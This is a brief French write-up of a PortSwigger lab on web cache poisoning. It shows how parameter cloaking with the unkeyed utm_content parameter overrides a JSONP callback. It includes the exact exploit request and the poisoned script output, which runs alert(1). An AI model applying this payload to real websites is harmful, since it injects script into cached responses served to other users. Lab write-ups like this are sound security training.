# Lab

https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking

## Payload

On cherche a polluer le cache pour que l'endpoint JSONP `/js/geolocate.js` soit appelé avec le paramètre `callback=alert(1);a=`.

```js
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
alert(1);a=({"country":"United Kingdom"});
```

On cherche un paramètre exclus de la clé de cache. On peut utiliser les paramètres UTM.

On trouve que le paramètre `utm_content` est exclus de la clé de cache.

Avec du paramètre cloaking, on peut faire en sorte que le paramètre `callback` soit remplacé par `utm_content`.

`GET /js/geolocate.js?callback=setCountryCookie&utm_content=qsd;callback=alert(1)%3ba=`